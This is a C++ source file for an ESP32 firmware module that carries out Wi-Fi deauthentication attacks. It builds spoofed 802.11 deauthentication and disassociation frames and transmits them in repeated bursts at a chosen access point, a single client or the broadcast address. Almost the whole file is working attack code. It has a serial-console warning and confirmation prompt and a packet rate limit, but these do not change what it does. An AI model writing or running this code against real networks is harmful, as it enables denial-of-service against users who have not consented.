/**
 * @file deauth.cpp
 * @brief Deauthentication Attack Implementation
 */

#include "deauth.h"
#include "wifi_sniffer.h"

// ==================== 全局实例 ====================
DeauthAttack Deauth;

// ==================== 构造函数/析构函数 ====================
DeauthAttack::DeauthAttack()
    : running(false)
    , mode(DEAUTH_MODE_SINGLE)
    , hasBSSID(false)
    , hasStation(false)
    , targetChannel(1)
    , reasonCode(REASON_CLASS3_FRAME_FROM_NONASSOC_STA)
    , burstCount(DEAUTH_BURST_COUNT)
    , intervalMs(DEAUTH_INTERVAL_MS)
    , maxPackets(0)
    , sentPackets(0)
    , failedPackets(0)
    , startTime(0)
    , rateLimitPPM(MAX_DEAUTH_PER_MINUTE)
    , lastMinuteStart(0)
    , packetsThisMinute(0)
    , attackTaskHandle(nullptr) {
    memset(targetBSSID, 0, sizeof(targetBSSID));
    memset(targetStation, 0, sizeof(targetStation));
}

DeauthAttack::~DeauthAttack() {
    end();
}

// ==================== 初始化 ====================
bool DeauthAttack::begin() {
    LOG_INFO("Initializing deauth attack module...");
    resetStatistics();
    return true;
}

void DeauthAttack::end() {
    stopAttack();
}

// ==================== 目标设置 ====================
void DeauthAttack::setTargetBSSID(const uint8_t* bssid) {
    memcpy(targetBSSID, bssid, 6);
    hasBSSID = true;
    
    char bssidStr[18];
    macToString(bssid, bssidStr, sizeof(bssidStr));
    LOG_INFO("Deauth target BSSID: %s", bssidStr);
}

void DeauthAttack::setTargetStation(const uint8_t* station) {
    memcpy(targetStation, station, 6);
    hasStation = true;
    
    char staStr[18];
    macToString(station, staStr, sizeof(staStr));
    LOG_INFO("Deauth target station: %s", staStr);
}

void DeauthAttack::setTargetChannel(uint8_t channel) {
    targetChannel = channel;
    Sniffer.setChannel(channel);
}

void DeauthAttack::setMode(DeauthMode m) {
    mode = m;
}

void DeauthAttack::setReasonCode(uint16_t reason) {
    reasonCode = reason;
}

void DeauthAttack::getTargetBSSID(uint8_t* bssid) const {
    memcpy(bssid, targetBSSID, 6);
}

void DeauthAttack::getTargetStation(uint8_t* station) const {
    memcpy(station, targetStation, 6);
}

// ==================== 攻击控制 ====================
bool DeauthAttack::startAttack() {
    if (running) {
        LOG_WARN("Deauth attack already running");
        return true;
    }
    
    if (!validateTarget()) {
        LOG_ERROR("Invalid target for deauth attack");
        return false;
    }
    
    // 安全检查
    if (REQUIRE_CONFIRMATION_FOR_ATTACK) {
        if (!confirmAttack()) {
            LOG_INFO("Deauth attack cancelled by user");
            return false;
        }
    }
    
    running = true;
    startTime = millis();
    currentMode = MODE_DEAUTH_ATTACK;
    
    // 设置信道
    Sniffer.setChannel(targetChannel);
    
    // 创建攻击任务
    xTaskCreatePinnedToCore(
        attackTask,
        "DeauthAttack",
        4096,
        this,
        1,
        &attackTaskHandle,
        0
    );
    
    LOG_WARN("Deauth attack started!");
    LOG_WARN("Target: %s %s",
             hasStation ? "station" : "broadcast",
             hasBSSID ? "BSSID" : "");
    
    return true;
}

void DeauthAttack::stopAttack() {
    if (!running) return;
    
    running = false;
    
    if (attackTaskHandle) {
        vTaskDelete(attackTaskHandle);
        attackTaskHandle = nullptr;
    }
    
    if (currentMode == MODE_DEAUTH_ATTACK) {
        currentMode = MODE_IDLE;
    }
    
    uint32_t duration = (millis() - startTime) / 1000;
    LOG_INFO("Deauth attack stopped after %d seconds", duration);
    LOG_INFO("Sent: %d, Failed: %d", sentPackets, failedPackets);
}

// ==================== 单次发送 ====================
bool DeauthAttack::sendDeauth() {
    if (!hasBSSID) return false;
    
    uint8_t dst[6];
    uint8_t src[6];
    
    switch (mode) {
        case DEAUTH_MODE_SINGLE:
        case DEAUTH_MODE_STATION:
            if (!hasStation) return false;
            memcpy(dst, targetStation, 6);
            memcpy(src, targetBSSID, 6);
            break;
            
        case DEAUTH_MODE_BROADCAST:
            memset(dst, 0xFF, 6);  // Broadcast
            memcpy(src, targetBSSID, 6);
            break;
            
        case DEAUTH_MODE_BSSID:
            memcpy(dst, targetBSSID, 6);
            memcpy(src, targetBSSID, 6);
            break;
    }
    
    return sendDeauthFrame(dst, src, targetBSSID);
}

bool DeauthAttack::sendDisassoc() {
    if (!hasBSSID) return false;
    
    uint8_t dst[6];
    uint8_t src[6];
    
    if (hasStation) {
        memcpy(dst, targetStation, 6);
        memcpy(src, targetBSSID, 6);
    } else {
        memset(dst, 0xFF, 6);
        memcpy(src, targetBSSID, 6);
    }
    
    return sendDisassocFrame(dst, src, targetBSSID);
}

bool DeauthAttack::sendDeauthTo(const uint8_t* dst, const uint8_t* src, 
                                 const uint8_t* bssid) {
    return sendDeauthFrame(dst, src, bssid);
}

// ==================== 统计 ====================
void DeauthAttack::resetStatistics() {
    sentPackets = 0;
    failedPackets = 0;
    packetsThisMinute = 0;
}

// ==================== 速率限制 ====================
void DeauthAttack::setRateLimit(uint16_t packetsPerMinute) {
    rateLimitPPM = packetsPerMinute;
}

bool DeauthAttack::checkRateLimit() {
    uint32_t now = millis();
    
    // 检查是否进入新的一分钟
    if (now - lastMinuteStart >= 60000) {
        lastMinuteStart = now;
        packetsThisMinute = 0;
    }
    
    if (packetsThisMinute >= rateLimitPPM) {
        return false;
    }
    
    packetsThisMinute++;
    return true;
}

// ==================== 确认对话框 ====================
bool DeauthAttack::confirmAttack() {
    // 在串口上请求确认
    Serial.println();
    Serial.println("╔══════════════════════════════════════════════════════════════╗");
    Serial.println("║                    ⚠️  WARNING ⚠️                            ║");
    Serial.println("║                                                              ║");
    Serial.println("║   You are about to perform a Deauthentication attack!        ║");
    Serial.println("║   This will disconnect clients from the target network.      ║");
    Serial.println("║                                                              ║");
    Serial.println("║   Only proceed if you have explicit authorization!           ║");
    Serial.println("║                                                              ║");
    Serial.println("╚══════════════════════════════════════════════════════════════╝");
    Serial.println();
    Serial.print("Type 'YES' to confirm: ");
    
    // 等待用户输入
    String response = Serial.readStringUntil('\n');
    response.trim();
    response.toUpperCase();
    
    return response == "YES";
}

// ==================== 任务函数 ====================
void DeauthAttack::attackTask(void* parameter) {
    DeauthAttack* attack = (DeauthAttack*)parameter;
    attack->runAttack();
    vTaskDelete(NULL);
}

void DeauthAttack::runAttack() {
    while (running) {
        // 检查速率限制
        if (!checkRateLimit()) {
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }
        
        // 发送 burst
        for (int i = 0; i < burstCount && running; i++) {
            if (!sendDeauth()) {
                failedPackets++;
            } else {
                sentPackets++;
            }
            
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        
        // 检查最大包数限制
        if (maxPackets > 0 && sentPackets >= maxPackets) {
            LOG_INFO("Max packets reached, stopping attack");
            break;
        }
        
        // 间隔
        vTaskDelay(pdMS_TO_TICKS(intervalMs));
    }
    
    running = false;
    currentMode = MODE_IDLE;
}

// ==================== 帧构建和发送 ====================
bool DeauthAttack::sendDeauthFrame(const uint8_t* dst, const uint8_t* src,
                                    const uint8_t* bssid) {
    DeauthFrame frame;
    buildDeauthFrame(&frame, dst, src, bssid);
    
    // 发送帧
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
    
    if (err != ESP_OK) {
        LOG_DEBUG("Failed to send deauth frame: %d", err);
        return false;
    }
    
    return true;
}

bool DeauthAttack::sendDisassocFrame(const uint8_t* dst, const uint8_t* src,
                                      const uint8_t* bssid) {
    DeauthFrame frame;
    buildDeauthFrame(&frame, dst, src, bssid);
    
    // 修改为 Disassociation 帧 (0xA0)
    frame.fc[0] = 0xA0;
    frame.fc[1] = 0x00;
    
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
    
    return err == ESP_OK;
}

void DeauthAttack::buildDeauthFrame(DeauthFrame* frame, const uint8_t* dst,
                                     const uint8_t* src, const uint8_t* bssid) {
    memset(frame, 0, sizeof(DeauthFrame));
    
    // Frame Control: Deauth (0xC0)
    frame->fc[0] = 0xC0;
    frame->fc[1] = 0x00;
    
    // Duration
    frame->duration = 0;
    
    // 地址
    memcpy(frame->destination, dst, 6);
    memcpy(frame->source, src, 6);
    memcpy(frame->bssid, bssid, 6);
    
    // Sequence Control (随机)
    frame->seqCtrl = random(0, 4096) << 4;
    
    // Reason Code
    frame->reasonCode = reasonCode;
}

// ==================== 辅助函数 ====================
bool DeauthAttack::validateTarget() const {
    if (!hasBSSID) {
        LOG_ERROR("No target BSSID set");
        return false;
    }
    
    // 检查 BSSID 是否有效 (不是全 0 或全 FF)
    bool allZero = true;
    bool allFF = true;
    
    for (int i = 0; i < 6; i++) {
        if (targetBSSID[i] != 0) allZero = false;
        if (targetBSSID[i] != 0xFF) allFF = false;
    }
    
    if (allZero || allFF) {
        LOG_ERROR("Invalid target BSSID");
        return false;
    }
    
    return true;
}

void DeauthAttack::logAttack(const char* action) {
    char bssidStr[18];
    char staStr[18];
    macToString(targetBSSID, bssidStr, sizeof(bssidStr));
    
    if (hasStation) {
        macToString(targetStation, staStr, sizeof(staStr));
        LOG_INFO("Deauth %s: BSSID=%s STA=%s", action, bssidStr, staStr);
    } else {
        LOG_INFO("Deauth %s: BSSID=%s (broadcast)", action, bssidStr);
    }
}

// ==================== 全局辅助函数 ====================
const char* getDeauthReasonString(uint16_t reason) {
    switch (reason) {
        case REASON_UNSPECIFIED: return "Unspecified";
        case REASON_PREV_AUTH_NOT_VALID: return "Previous authentication no longer valid";
        case REASON_DEAUTH_LEAVING: return "Deauthenticated because sending station is leaving";
        case REASON_DISASSOC_DUE_TO_INACTIVITY: return "Disassociated due to inactivity";
        case REASON_DISASSOC_AP_BUSY: return "Disassociated because AP is unable to handle all stations";
        case REASON_CLASS2_FRAME_FROM_NONAUTH_STA: return "Class 2 frame received from nonauthenticated station";
        case REASON_CLASS3_FRAME_FROM_NONASSOC_STA: return "Class 3 frame received from nonassociated station";
        case REASON_DISASSOC_STA_HAS_LEFT: return "Disassociated because sending station is leaving BSS";
        case REASON_STA_REQ_ASSOC_WITHOUT_AUTH: return "Station requesting association without authentication";
        case REASON_PWR_CAPABILITY_NOT_VALID: return "Power capability not valid";
        case REASON_SUPPORTED_CHANNEL_NOT_VALID: return "Supported channels not valid";
        case REASON_INVALID_IE: return "Invalid information element";
        case REASON_MIC_FAILURE: return "MIC failure";
        case REASON_4WAY_HANDSHAKE_TIMEOUT: return "4-way handshake timeout";
        case REASON_GROUP_KEY_UPDATE_TIMEOUT: return "Group key handshake timeout";
        case REASON_IE_IN_4WAY_DIFFERS: return "Information element in 4-way handshake different";
        case REASON_INVALID_GROUP_CIPHER: return "Invalid group cipher";
        case REASON_INVALID_PAIRWISE_CIPHER: return "Invalid pairwise cipher";
        case REASON_INVALID_AKMP: return "Invalid AKMP";
        case REASON_UNSUPPORTED_RSN_IE_VERSION: return "Unsupported RSN information element version";
        case REASON_INVALID_RSN_IE_CAP: return "Invalid RSN information element capabilities";
        case REASON_IEEE_802_1X_AUTH_FAILED: return "IEEE 802.1X authentication failed";
        case REASON_CIPHER_SUITE_REJECTED: return "Cipher suite rejected";
        default: return "Unknown";
    }
}

const char* getDeauthModeString(DeauthMode mode) {
    switch (mode) {
        case DEAUTH_MODE_SINGLE: return "Single";
        case DEAUTH_MODE_BROADCAST: return "Broadcast";
        case DEAUTH_MODE_BSSID: return "BSSID";
        case DEAUTH_MODE_STATION: return "Station";
        default: return "Unknown";
    }
}
